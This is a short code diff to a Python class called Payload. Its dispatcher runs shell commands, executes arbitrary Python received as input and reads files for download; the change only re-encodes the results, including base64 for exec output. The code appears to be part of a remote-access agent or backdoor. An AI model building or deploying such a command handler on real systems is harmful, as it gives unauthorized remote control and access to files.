@@ -35,11 +35,11 @@ class Payload(object):
 			cmd['res'] = utils.cd(cmd['dir'])
 			return cmd
 		elif cmd['type'] == "sh":
-			cmd['res'] = utils.sh(cmd['cmd'])
+			cmd['res'] = utils.force_decode(utils.sh(cmd['cmd']))
 			return cmd
 		elif cmd['type'] == "exec":
 			exec(cmd['cmd'])
-			cmd['res'] = globals()[cmd['out']]
+			cmd['res'] = utils.b64e(globals()[cmd['out']])
 			return cmd
 		elif cmd['type'] == "dl":
 			fd = open(cmd['fn'],"rb").read()
